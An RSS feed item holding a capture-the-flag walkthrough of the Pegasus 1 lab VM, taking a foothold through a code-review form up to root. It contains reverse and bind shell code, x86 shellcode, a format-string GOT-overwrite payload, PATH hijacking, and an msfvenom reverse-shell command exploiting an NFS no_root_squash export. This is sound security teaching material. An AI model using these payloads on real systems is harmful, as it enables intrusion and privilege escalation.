<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Pegasus on Cheesy Rumbles</title>
    <link>http://rastamouse.me/categories/pegasus/</link>
    <description>Recent content in Pegasus on Cheesy Rumbles</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 20 Dec 2014 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://rastamouse.me/categories/pegasus/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Pegasus: 1</title>
      <link>http://rastamouse.me/writeups/2014/pegasus-1/</link>
      <pubDate>Sat, 20 Dec 2014 00:00:00 +0000</pubDate>
      
      <guid>http://rastamouse.me/writeups/2014/pegasus-1/</guid>
      <description>

&lt;p&gt;Pegasus 1 is the first VM written by &lt;a href=&#34;https://twitter.com/@TheKnapsy&#34;&gt;Knapsy&lt;/a&gt;, which he describes as being pitched at &amp;lsquo;intermediate&amp;rsquo; difficulty.  It&amp;rsquo;s certainly a tricky VM, which I tore my hair out solving!&lt;/p&gt;

&lt;h2 id=&#34;nmap:91c607fe46b1f5fb0d58bc60ee1366ec&#34;&gt;Nmap&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -A -p- 192.168.127.102

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 77:89:5b:52:ed:a5:58:6e:8e:09:f3:9e:f1:b0:d9:98 (DSA)
|   2048 d6:62:f5:12:31:36:ed:08:2c:1a:5e:9f:3c:aa:1f:d2 (RSA)
|_  256 c5:f0:be:e5:c0:9c:28:6e:23:5c:48:38:8b:4a:c4:43 (ECDSA)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          49479/tcp  status
|_  100024  1          56854/udp  status
8088/tcp  open  http    nginx 1.1.19
|_http-methods: No Allow or Public header in OPTIONS response (status code 405)
|_http-title: Pegasus Technologies - Under Construction
56996/tcp open  status  1 (RPC #100024)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There is nothing much to see in regards to the SSH or RPC service.  Loading up port 8088 in a browser you find a nice picture of Pegasus.&lt;/p&gt;




    
    
        
        
        
        
    

    
    
    

    
    




    


    

    
        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
            &lt;img src=&#34;http://rastamouse.me/img/writeups/pegasus-1/pegasus.jpg&#34; alt=&#34;&#34; /&gt;
        &lt;/span&gt;&lt;/p&gt;
    



&lt;p&gt;Looking at the source code, I saw that the JPG had a filename of &lt;code&gt;pegasus_by_exomemory-d5ofhgw&lt;/code&gt;.  This seemed to be a hint of some sort, so I downloaded it to my machine for some analysis.  After about half-an-hour of not finding anything, I went back to nginx.&lt;/p&gt;

&lt;p&gt;I wanted to crawl the service for any additional files or directories, so fired up &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hc 404 http://192.168.127.102:8088/FUZZ

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.127.102:8088/FUZZ
Payload type: file,/usr/share/wfuzz/wordlist/general/megabeast.txt

Total requests: 45463
==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

00001:  C=200      9 L	      18 W	    189 Ch	  &amp;quot; - admin&amp;quot;
00002:  C=200      9 L	      18 W	    189 Ch	  &amp;quot; - bak&amp;quot;
00003:  C=200      9 L	      18 W	    189 Ch	  &amp;quot; - Admin&amp;quot;
00004:  C=200      9 L	      18 W	    189 Ch	  &amp;quot; - Backup&amp;quot;
00005:  C=200      9 L	      18 W	    189 Ch	  &amp;quot; - warez&amp;quot;
00006:  C=200      9 L	      18 W	    189 Ch	  &amp;quot; - pr0n&amp;quot;
00007:  C=200      9 L	      18 W	    189 Ch	  &amp;quot; - porn&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I cancelled this straight away because as you can see, every request came back with a &lt;code&gt;200 OK&lt;/code&gt; response.  Every response is the same size - manually checking in a browser, I found that it just returns the same image as before.&lt;/p&gt;

&lt;p&gt;I found that if you stick a file extension on the end of the request, you do get &lt;code&gt;404 Not Found&lt;/code&gt; responses.  So I adapted my fuzzing to only request resources with a &lt;code&gt;.php&lt;/code&gt; extension.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hc 404 http://192.168.127.102:8088/FUZZ.php

39916:  C=200      0 L	       4 W	     19 Ch	  &amp;quot; - submit&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Browsing to this page, all I saw was the message: &lt;code&gt;No data to process.&lt;/code&gt;  Without any obvious way of knowing how to submit data via this, I figured another page may be submitting to it from a form or something.  I just needed to find it, so I kept throwing wordlists until I found:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;83134:  C=200     14 L	      58 W	    488 Ch	  &amp;quot; - codereview&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
	&amp;lt;head&amp;gt;
		&amp;lt;title&amp;gt;Pegasus Technologies - Code Review&amp;lt;/title&amp;gt;
	&amp;lt;/head&amp;gt;
	&amp;lt;body&amp;gt;
		&amp;lt;h1&amp;gt;Code review&amp;lt;/h1&amp;gt;
		&amp;lt;p&amp;gt;Note: our trainee (Mike) will be reviewing the code until we come up with an official process and a proper portal for code submission.&amp;lt;/p&amp;gt;
		&amp;lt;p&amp;gt;In the meantime, please use the form below.&amp;lt;/p&amp;gt;
		&amp;lt;form action=&amp;quot;submit.php&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
			&amp;lt;textarea name=&amp;quot;code&amp;quot; id=&amp;quot;textarea&amp;quot; cols=60 rows=30&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;br/&amp;gt;
			&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit&amp;quot; /&amp;gt;
		&amp;lt;/form&amp;gt;
	&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this page really does submit to &lt;code&gt;submit.php&lt;/code&gt; - the idea is that you can submit some code for &amp;lsquo;review&amp;rsquo; and a trainee called Mike will check it out for us.  I think we can assume that since Mike is a trainee, he&amp;rsquo;s bound to make &amp;lsquo;mistakes&amp;rsquo; and probably won&amp;rsquo;t be checking our code too carefully before running it.  The only problem, is that there&amp;rsquo;s no indication of any language the code needs to be in.&lt;/p&gt;

&lt;p&gt;I don&amp;rsquo;t think there is much to this than just guessing, so I spammed the box with all sorts of different reverse shell commands for bash, perl, python, ruby, php and java.  Nothing&amp;hellip; Each submission came back with &lt;code&gt;Sent for review!&lt;/code&gt; but nothing was running.&lt;/p&gt;

&lt;p&gt;I eventually got a different response when I tried:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;system(&amp;quot;ping 192.168.127.101&amp;quot;);
...
Sorry, due to security precautions, Mike won&#39;t review any code containing system() function call.
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;reverse-shell:91c607fe46b1f5fb0d58bc60ee1366ec&#34;&gt;Reverse Shell?&lt;/h2&gt;

&lt;p&gt;So it&amp;rsquo;s looking like C is what needs to be submitted, but we can&amp;rsquo;t use this function.  I submitted C code which, when compiled, would initial a reverse shell back to my machine.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;char shellcode[] =
&amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&amp;quot;
&amp;quot;\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x7f\x65\x68&amp;quot;
&amp;quot;\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1&amp;quot;
&amp;quot;\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3&amp;quot;
&amp;quot;\x52\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;;

int main()
{
        int (*ret)() = (int(*)())shellcode;
        ret();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This didn&amp;rsquo;t work however - tests on my local machine showed that it must be compiled with &lt;code&gt;no-stack-protector&lt;/code&gt; and &lt;code&gt;execstack&lt;/code&gt; for the binary to run; which is not being done on Pegasus.&lt;/p&gt;

&lt;h2 id=&#34;bind-shell:91c607fe46b1f5fb0d58bc60ee1366ec&#34;&gt;Bind Shell!&lt;/h2&gt;

&lt;p&gt;My next option was to attempt bind shellcode.  There&amp;rsquo;s no shortage of examples on the Internet, and I found a good post by &lt;a href=&#34;http://www.iodigitalsec.com/linux-shell-bind-tcp-shellcode/&#34;&gt;Adam Palmer&lt;/a&gt; made as part of the &lt;a href=&#34;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&#34;&gt;SLAE&lt;/a&gt; course.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;

int main(void)
{
        int clientfd, sockfd;
        int dstport = 4444;
        int o = 1;
        struct sockaddr_in mysockaddr;

        sockfd = socket(AF_INET, SOCK_STREAM, 0);

        mysockaddr.sin_family = AF_INET;
        mysockaddr.sin_port = htons(dstport);
        mysockaddr.sin_addr.s_addr = INADDR_ANY;

        bind(sockfd, (struct sockaddr *) &amp;amp;mysockaddr, sizeof(mysockaddr));

        listen(sockfd, 0);

        clientfd = accept(sockfd, NULL, NULL);

        dup2(clientfd, 0);
        dup2(clientfd, 1);
        dup2(clientfd, 2);

        execve(&amp;quot;/bin/sh&amp;quot;, NULL, NULL);
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I submitted this code, port scanned port 4444 and then connected to it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p4444 192.168.127.102

PORT     STATE SERVICE
4444/tcp open  krb524
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc -n 192.168.127.102 4444
id
uid=1001(mike) gid=1001(mike) groups=1001(mike)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There is a timeout to each process which gets executed, so my shell closed after a few minutes.  I just reconnected and echo&amp;rsquo;d my public SSH key into Mike&amp;rsquo;s .ssh authorized_keys file.&lt;/p&gt;

&lt;h2 id=&#34;mike:91c607fe46b1f5fb0d58bc60ee1366ec&#34;&gt;Mike&lt;/h2&gt;

&lt;p&gt;Mike has an email waiting to be read:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mike@pegasus:~$ cat /var/spool/mail/mike 

Hi Mike,

I&#39;ve crafted something simple in C, treating it as a refresher course for myself (it&#39;s been YEARS since I last coded something up) - would you mind reviewing it for me?

I&#39;ve put the binary in your home directory for convenience. You can also find the source code under our local git repo: my_first.git

Thanks!
John
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;True to his word, you can find the &lt;code&gt;my_first&lt;/code&gt; binary in &lt;code&gt;/home/mike&lt;/code&gt; and &lt;code&gt;my_first.git&lt;/code&gt; in &lt;code&gt;/opt/git/&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwsrwxrwx 1 john john   6606 Nov 28 10:26 my_first*
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can clone the git repository to view the source code for &lt;code&gt;my_first&lt;/code&gt;, but I just prodded the binary as it was.  It is owned by John and has the SUID bit set, so exploiting this will give us access as John.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mike@pegasus:~$ ./my_first 
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I tested the various inputs of each of the Selections, for obvious things such as buffer overflows.  But eventually I found a string format vulnerability in the Calculator function.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Selection: 1

Enter first number: 1
Enter second number: %p
Error details: 0xbf81186c
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;string-format:91c607fe46b1f5fb0d58bc60ee1366ec&#34;&gt;String Format&lt;/h2&gt;

&lt;p&gt;I absolutely &lt;em&gt;hate&lt;/em&gt; string format vulns, because they&amp;rsquo;re so god damn picky to get working.  The first job is to determine where the string starts on the stack.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Enter second number: AAAA%p%p%p%p%p%p%p%p%p%p
Error details: AAAA0xbf81186c0xa0xb759d1600xb770fac00xfbad22880x40xbf8118700x414141410x702570250x70257025
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I make that to be the 8th position.  To confirm:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Enter second number: AAAA%8$p
Error details: AAAA0x41414141
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ASLR is enabled on Pegasus, which we can bypass using &lt;code&gt;ulimit&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mike@pegasus:~$ cat /proc/sys/kernel/randomize_va_space
2
mike@pegasus:~$ ulimit -s unlimited
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we need to collect some addresses.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mike@pegasus:~$ objdump -R my_first

my_first:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049bec R_386_GLOB_DAT    __gmon_start__
08049c20 R_386_COPY        stdin
08049bfc R_386_JUMP_SLOT   printf
08049c00 R_386_JUMP_SLOT   fgets
08049c04 R_386_JUMP_SLOT   puts
08049c08 R_386_JUMP_SLOT   __gmon_start__
08049c0c R_386_JUMP_SLOT   __libc_start_main
08049c10 R_386_JUMP_SLOT   putchar
08049c14 R_386_JUMP_SLOT   strtol
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The GOT pointer for &lt;code&gt;printf&lt;/code&gt; is at &lt;code&gt;0x08049bfc&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mike@pegasus:~$ gdb -q ./my_first
(gdb) b main
Breakpoint 1 at 0x804850f
(gdb) r
Starting program: /home/mike/my_first

Breakpoint 1, 0x0804850f in main ()
(gdb) p system
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x40069060 &amp;lt;system&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The address for &lt;code&gt;system&lt;/code&gt; is at &lt;code&gt;0x40069060&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The plan of attack is to overwrite the address for &lt;code&gt;printf&lt;/code&gt; with &lt;code&gt;system&lt;/code&gt; and hopefully execute something such as &lt;code&gt;/bin/dash&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To find a place to break, I disassembled the main function and chose a &lt;code&gt;mov&lt;/code&gt; instruction just before &lt;code&gt;printf&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;0x08048569 &amp;lt;+93&amp;gt;:	mov    DWORD PTR [esp],0x8048905
0x08048570 &amp;lt;+100&amp;gt;:	call   0x80483b0 &amp;lt;printf@plt&amp;gt;
0x08048575 &amp;lt;+105&amp;gt;:	mov    eax,ds:0x8049c20
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mike@pegasus:~$ printf &#39;1\n\n\xfc\x9b\x04\x08%%8$n&#39; &amp;gt; sploit

Breakpoint 1, 0x08048569 in main ()
(gdb) x/x 0x08049bfc
0x8049bfc &amp;lt;printf@got.plt&amp;gt;:     0x00000004
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This confirms that I am able to overwrite the pointer for &lt;code&gt;printf&lt;/code&gt;, so now to replace it with the address for &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mike@pegasus:~$ printf &#39;1\n\n\xfe\x9b\x04\x08\xfc\x9b\x04\x08%%16382u%%8$hn%%20570u%%9$hn&#39; &amp;gt; sploit

(gdb) x/x 0x08049bfc
0x8049bfc &amp;lt;printf@got.plt&amp;gt;:     0x40069060
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now to run it outside of GDB.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mike@pegasus:~$ cat sploit | ./my_first

sh: 1: Selection:: not found

Bye!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So now, the binary is looking for something called &lt;code&gt;Selection:&lt;/code&gt;, time to place my payload.  I created a new binary which would copy &lt;code&gt;/bin/dash&lt;/code&gt; into &lt;code&gt;/tmp&lt;/code&gt; and set the SUID for john.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
        system(&amp;quot;/bin/cp /bin/dash /tmp/sh&amp;quot;);
        system(&amp;quot;/bin/chmod 4777 /tmp/sh&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Compile this and ensure it&amp;rsquo;s called &lt;code&gt;Selection:&lt;/code&gt;.  Now modify the environmental PATH variable to ensure it gets executed.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mike@pegasus:~$ export PATH=.:$PATH
mike@pegasus:~$ env
PATH=.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mike@pegasus:~$ cat sploit | ./my_first 
mike@pegasus:~$ ll /tmp/
-rwsrwxrwx  1 john mike 100284 Dec 20 10:59 sh*
mike@pegasus:~$ /tmp/sh 
$ id
uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;uids-gids:91c607fe46b1f5fb0d58bc60ee1366ec&#34;&gt;UIDs &amp;amp; GIDs&lt;/h2&gt;

&lt;p&gt;Currently, my &lt;code&gt;uid/gid=1001(mike)&lt;/code&gt; and &lt;code&gt;euid=1000(john)&lt;/code&gt;.  This means that I am able to browse john&amp;rsquo;s home directory and create files.  But I lack the proper permissions to setup authorized_keys for john.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rw-rw-r-- 1 john mike    0 Dec 20 11:05 authorized_keys
$ chown john:john authorized_keys
chown: changing ownership of `authorized_keys&#39;: Operation not permitted
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Because the SUID bit is only set for &lt;code&gt;user&lt;/code&gt; and not &lt;code&gt;group&lt;/code&gt; on &lt;code&gt;my_first&lt;/code&gt;, I don&amp;rsquo;t believe there is a way for me to obtain group rights for john.  One of the things I wanted to do, was check John&amp;rsquo;s sudo rights.  But because my current UID is for Mike, I get prompted for his password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ id
uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
$ sudo -l
[sudo] password for mike:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What I wanted to do, was set my UID to &lt;code&gt;1000(john)&lt;/code&gt;.  To do this, I wrote another binary in &lt;code&gt;/tmp&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
 
int main(int argc, char *argv[])
{
	setreuid(1000,1000);
	execv(&amp;quot;/bin/dash&amp;quot;, argv);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ./uid
$ id
uid=1000(john) gid=1001(mike) groups=1000(john),1001(mike)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now my UID is correctly set, and I can run &lt;code&gt;sudo&lt;/code&gt; as John.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ sudo -l
Matching Defaults entries for john on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on this host:
    (root) NOPASSWD: /usr/local/sbin/nfs
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;nfs:91c607fe46b1f5fb0d58bc60ee1366ec&#34;&gt;NFS&lt;/h2&gt;

&lt;p&gt;John may run NFS as root, reviewing &lt;code&gt;/etc/exports&lt;/code&gt; reveals the following line:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cat /etc/exports
/opt/nfs	*(rw,sync,crossmnt,no_subtree_check,no_root_squash)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;no_root_squash&lt;/code&gt; is a critical configuration item as it fails to prevent root users of other systems writing root owned files to the NFS share (&lt;code&gt;root_squash&lt;/code&gt; ensures the permissions of files are &amp;lsquo;squashed&amp;rsquo; to &lt;code&gt;nodody:nobody&lt;/code&gt;).  Since I am root on Kali, it means I can mount the share, write a binary to it, set SUID etc and those permissions will persist on Pegasus which I can execute as any user.&lt;/p&gt;

&lt;p&gt;First, I start the NFS daemon.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ sudo /usr/local/sbin/nfs start
 * Exporting directories for NFS kernel daemon...                                                                                                      [ OK ] 
 * Starting NFS kernel daemon
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Mount it on my Kali machine.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# mount.nfs 192.168.127.102:/opt/nfs /mnt/
root@kali:~# cd /mnt/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I will just create a basic reverse shell using &lt;code&gt;msfvenom&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:/mnt# msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.127.101 lport=4444 -f elf &amp;gt; shell
root@kali:/mnt# chmod 4777 shell 

-rwsrwxrwx 1 root root 152 Dec 20 00:37 shell
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, I can setup my listener and execute the shell from Pegasus.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cd /opt/nfs
$ ls -l
-rwsrwxrwx 1 root root 152 Dec 20 11:37 shell
$ ./shell
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.127.101] from (UNKNOWN) [192.168.127.102] 43805
id; whoami
uid=1000(john) gid=1001(mike) euid=0(root) groups=0(root),1001(mike)
root
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;flag:91c607fe46b1f5fb0d58bc60ee1366ec&#34;&gt;Flag&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ls -l /root
-rw------- 1 root root 1824 Dec 16 19:09 flag

cat /root/flag

               ,
               |`\        
              /&#39;_/_   
            ,&#39;_/\_/\_                       ,   
          ,&#39;_/\&#39;_\_,/_                    ,&#39;| 
        ,&#39;_/\_&#39;_ \_ \_/                _,-&#39;_/
      ,&#39;_/&#39;\_&#39;_ \_ \&#39;_,\           _,-&#39;_,-/ \,      Pegasus is one of the best
    ,&#39; /_\ _&#39;_ \_ \&#39;_,/       __,-&#39;&amp;lt;_,&#39; _,\_,/      known creatures in Greek
   ( (&#39; )\/(_ \_ \&#39;_,\   __--&#39; _,-_/_,-&#39;,_/ _\      mythology. He is a winged
    \_`\&amp;gt; 6` 7  \&#39;_,/ ,-&#39; _,-,&#39;\,_&#39;_ \,_/&#39;_,\       stallion usually depicted
     \/-  _/ 7 &#39;/ _,&#39; _/&#39;\_  \,_&#39;_ \_ \&#39;_,/         as pure white in color.
      \_&#39;/&amp;gt;   7&#39;_/&#39; _/&#39; \_ &#39;\,_&#39;_ \_ \&#39;_,\          Symbol of wisdom and fame.
        &amp;gt;/  _ ,V  ,&amp;lt;  \__ &#39;\,_&#39;_ \_ \&#39;_,/
      /&#39;_  ( )_)\/-,&#39;,__ &#39;\,_&#39;_,\_,\&#39;_\             Fun fact: Pegasus was also
     ( ) \_ \|_  `\_    \_,/&#39;\,_&#39;_,/&#39;               a video game system sold in
      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
       \_)   &amp;gt;        `\_                           It was a hardware clone of
            /  `,      |`\_                         the Nintendo Famicom.
           /    \     / \ `\
          /   __/|   /  /  `\  
         (`  (   (` (_  \   /   
         /  ,/    |  /  /   \   
        / ,/      | /   \   `\_ 
      _/_/        |/    /__/,_/
     /_(         /_( 


CONGRATULATIONS! You made it :)

Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
learnt a thing or two while doing it! :)

Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
providing first review.

Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
and leave some feedback, I would love to hear from you!

Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
more awesome boot2root VMs!
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
  </channel>
</rss>